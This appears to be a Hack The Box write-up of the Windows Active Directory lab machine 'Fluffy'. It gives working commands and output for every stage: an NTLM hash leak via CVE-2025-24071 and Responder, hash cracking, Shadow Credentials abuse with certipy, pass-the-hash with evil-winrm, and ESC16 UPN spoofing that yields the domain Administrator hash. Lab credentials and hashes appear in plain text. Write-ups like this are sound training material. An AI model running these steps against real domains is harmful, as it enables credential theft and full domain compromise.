### HTB Write-Up: Fluffy
| Field | Details |
| ------ | ------ |
| Platform | Hack The Box |
| Difficulty | Easy |
| OS | Windows |
| Author | Faridd |
| Date | June 28, 2026 |

**Starting credentials provided:** `j.fleischman` / `J0elTHEM4n1990!`

--------------------------------------------------------------------------------

#### Overview
Fluffy is an Easy-rated Windows Active Directory machine. Starting with low-privilege domain credentials, enumeration of an IT SMB share reveals an `Upgrade_Notice.pdf` containing a list of CVEs. One of these — **CVE-2025-24071**, a Windows File Explorer NTLM hash leak — is exploited by placing a malicious `.library-ms` file on the writable share, capturing the NTLMv2 hash of `p.agila` via Responder. BloodHound analysis then reveals a privilege chain: `p.agila` is a member of **Service Account Manager**, which holds **GenericAll** over the **SERVICE ACCOUNTS** group, which in turn has **GenericWrite** over `winrm_svc`. This ACE chain is abused using a **Shadow Credentials** attack to retrieve the NT hash of `winrm_svc`. Finally, the same Shadow Credentials technique is applied to `ca_svc`, which is found to be vulnerable to **ESC16**, allowing UPN spoofing to obtain an Administrator certificate and recover the domain Administrator's NT hash.

--------------------------------------------------------------------------------

#### Table of Contents
1. Reconnaissance
2. Enumeration
3. Initial Foothold — CVE-2025-24071 (NTLM Hash Leak)
4. Lateral Movement — Shadow Credentials → winrm_svc
5. Privilege Escalation — ESC16 via ca_svc

--------------------------------------------------------------------------------

#### Reconnaissance
Port scanning was performed using **RustScan** for rapid discovery, followed by a targeted **Nmap** service scan.

```bash
rustscan -a 10.129.20.210
```
> Open 10.129.20.210:53, 88, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389

```bash
nmap -sC -sV -p88,389,445,593,636,3268 10.129.20.210
```
> PORT 88/tcp open kerberos-sec Microsoft Windows Kerberos  
> PORT 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fluffy.htb)  
> PORT 445/tcp open microsoft-ds?  
> Host script results: smb2-security-mode: Message signing enabled and required

**Key observations:**
*   **Hostname:** `DC01.fluffy.htb` — Primary Domain Controller.
*   **OS:** Windows Server 2019 (Build 17763).
*   **SMB Signing:** **Required** — This prevents NTLM relay attacks.
*   **WinRM:** Port 5985 is open, indicating a shell entry point for later.

##### Open Ports Summary
| Port | Service | Notes |
| ------ | ------ | ------ |
| 53/tcp | DNS | AD-integrated DNS |
| 88/tcp | Kerberos | Authentication server |
| 389/tcp | LDAP | User/group/SPN enumeration |
| 445/tcp | SMB | Signing required |
| 5985/tcp | WinRM | PowerShell remoting |

--------------------------------------------------------------------------------

#### Enumeration
##### SMB Share Enumeration
Using the provided credentials for `j.fleischman`, the available shares were enumerated.

```bash
netexec smb 10.129.20.210 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```
> [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!  
> IT READ,WRITE

The **IT** share is both readable and writable, which is a critical finding for planting a malicious file.

##### IT Share Contents
The contents of the share were explored using `smbclient`.

```bash
smbclient //10.129.20.210/IT -U 'j.fleischman%J0elTHEM4n1990!'
```
> smb: > ls  
> Upgrade_Notice.pdf A 169963 Sat May 17 18:31:07 2025  
> KeePass-2.58.zip A 3225346 Fri Apr 18 19:03:17 2025  
> Everything-1.4.1.1026.x64.zip A 1827464 Fri Apr 18 19:04:05 2025

##### CVE-2025-24071 Identified
The `Upgrade_Notice.pdf` revealed a list of CVEs for workers to fix. Research identified **CVE-2025-24071** as a Critical vulnerability involving a Windows File Explorer NTLMv2 Hash Leak.

**Exploit Link:** You can download the exploit from this link: [https://www.exploit-db.com/exploits/52310](https://www.exploit-db.com/exploits/52310).

--------------------------------------------------------------------------------

#### Initial Foothold
##### CVE-2025-24071 — Capturing p.agila's NTLMv2 Hash
**Step 1 — Generate the malicious ZIP:**
The exploit script creates a ZIP file containing a malicious `.library-ms` file.

```bash
python3 52310.py -i 10.10.14.188
```
> [*] Generating malicious .library-ms file...  
> [+] Created ZIP: output/hardntlm.zip  
> [!] Done.

**Step 2 — Start Responder:**
Responder must be listening before the file is uploaded to capture the immediate authentication attempt.

```bash
sudo responder -I tun0 -dwv
```

**Step 3 — Upload the malicious ZIP to the IT share:**
Because the IT share is writable, the ZIP is uploaded where a user like `p.agila` might interact with it.

```bash
smbclient //10.129.20.210/IT -U 'j.fleischman%J0elTHEM4n1990!'
smb: > put hardntlm.zip
```

**Step 4 — Hash captured:**
When the system processes the ZIP, the hash for `p.agila` is leaked to Responder.

> [SMB] NTLMv2-SSP Username : FLUFFY\p.agila  
> [SMB] NTLMv2-SSP Hash : p.agila::FLUFFY:42bed17e546933f0...

**Step 5 — Crack the hash offline:**
Using `hashcat` and the `rockyou.txt` wordlist, the hash was cracked.

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
> P.AGILA::FLUFFY...:prometheusx-303

**Credentials obtained:** `p.agila` / `prometheusx-303`

--------------------------------------------------------------------------------

#### Lateral Movement
##### ACE Chain Discovery (BloodHound)
BloodHound analysis was performed to find a path to higher privileges.

```bash
bloodhound-python -ns 10.129.20.210 -d fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --zip -c All
```
> INFO: Compressing output into 20260628183316_bloodhound.zip

**Analysis:** `p.agila` is in **Service Account Manager**, which has **GenericAll** over **SERVICE ACCOUNTS**. This group has **GenericWrite** over `winrm_svc`, enabling a Shadow Credentials attack.

##### Step 1 — Add p.agila to Service Accounts Group
To use the group's permissions over `winrm_svc`, `p.agila` adds themselves to the **SERVICE ACCOUNTS** group.

```bash
bloodyAD --host 10.129.20.210 -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' 'p.agila'
```
> [+] p.agila added to SERVICE ACCOUNTS

##### Step 2 — Shadow Credentials Attack on winrm_svc
Using `certipy`, a Key Credential is injected into the `winrm_svc` account to retrieve its NT hash.

```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.129.20.210 -target 10.129.20.210
```
> [ *] Successfully added Key Credential to 'winrm_svc'  
> [ *] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767  
> [ *] Restored old Key Credentials for 'winrm_svc'

##### Step 3 — WinRM Access and User Flag
Access is gained via Pass-the-Hash.

```bash
evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```
> *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt  
> 16c41d5185e03a3942b86d336d337223

--------------------------------------------------------------------------------

#### Privilege Escalation
##### ca_svc — Certificate Authority Service Account
The **SERVICE ACCOUNTS** group (now including `p.agila`) also has **GenericAll** over the `ca_svc` account, which manages the Certificate Authority.

##### Step 1 — Shadow Credentials Attack on ca_svc
The Shadow Credentials attack is repeated to obtain the `ca_svc` NT hash.

```bash
certipy-ad shadow auto -username p.agila -password 'prometheusx-303' -dc-ip 10.129.20.210 -target 10.129.20.210 -account ca_svc
```
> [ *] Successfully added Key Credential to 'ca_svc'  
> [ *] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8

##### Step 2 — Certificate Authority Enumeration (ESC16)
Using `ca_svc` credentials, the CA is audited for vulnerabilities.

```bash
certipy-ad find -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.20.210 -vulnerable
```
> [!] Vulnerabilities ESC16 : Security Extension is disabled.

**Theory:** ESC16 occurs when the CA's security extensions (SID-based binding) are disabled. This allows authentication based strictly on the User Principal Name (UPN) written on the certificate.

##### Step 3 — UPN Spoofing: Set ca_svc UPN to "administrator"
By changing the `ca_svc` UPN to `administrator`, the DC will associate any certificate requested by this account with the Domain Admin.

```bash
certipy-ad account update -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -user 'ca_svc' -upn administrator -dc-ip 10.129.20.210
```
> ### [*] Successfully updated 'ca_svc' — userPrincipalName: administrator

##### Step 4 — Request a Certificate as "administrator"
A certificate is requested using the spoofed UPN.

```bash
certipy-ad req -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.20.210 -target dc01.fluffy.htb -ca 'fluffy-DC01-CA' -template 'User'
```
> [ *] Saved certificate and private key to 'administrator.pfx'

##### Step 5 — Restore ca_svc UPN (Critical Cleanup Step)
The UPN **must** be restored to its original value before authentication, otherwise the DC cannot map the certificate back to the account correctly, resulting in a "Name mismatch" error.

```bash
certipy-ad account update -username 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -user 'ca_svc' -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.20.210
```
> ### [*] Successfully updated 'ca_svc' — userPrincipalName: ca_svc@fluffy.htb

##### Step 6 — Authenticate and Retrieve Administrator NT Hash
With the UPN restored, the certificate is used to authenticate as the Domain Administrator.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88 -domain fluffy.htb
```
> [ *] Using principal: 'administrator@fluffy.htb'  
> [*] Got hash for 'administrator@fluffy.htb': aad3b435...:8da83a3fa618b6e3a00e93f676c92a6e

**Administrator NT Hash:** `8da83a3fa618b6e3a00e93f676c92a6e`

##### Step 7 — Pass-the-Hash as Administrator
The final root flag is obtained by logging in with the Administrator's NT hash.

--------------------------------------------------------------------------------

#### Techniques & Tools Referenced
| Technique / Tool | Purpose |
| ------ | ------ |
| RustScan / Nmap | Reconnaissance and port scanning |
| NetExec / smbclient | SMB enumeration and file transfer |
| CVE-2025-24071 | NTLM hash leak via malicious `.library-ms` file |
| Responder | Capturing NTLMv2 hashes |
| BloodHound | AD ACE chain discovery |
| BloodyAD | Group membership manipulation |
| Certipy shadow auto | Shadow Credentials attack |
| ESC16 | CA UPN spoofing vulnerability |
| Evil-WinRM | Pass-the-Hash authentication |

--------------------------------------------------------------------------------

#### Key Takeaways
*   **Writable SMB Shares:** They are a high-risk misconfiguration that enables silent credential leaks via vulnerabilities like CVE-2025-24071.
*   **Shadow Credentials:** This attack is operationally "clean" because tools like `certipy` automatically restore the modified attributes after exploitation.
*   **ESC16 & UPN Restoration:** The UPN restoration step is mandatory; failing to restore it before authentication will cause the certificate mapping to fail.
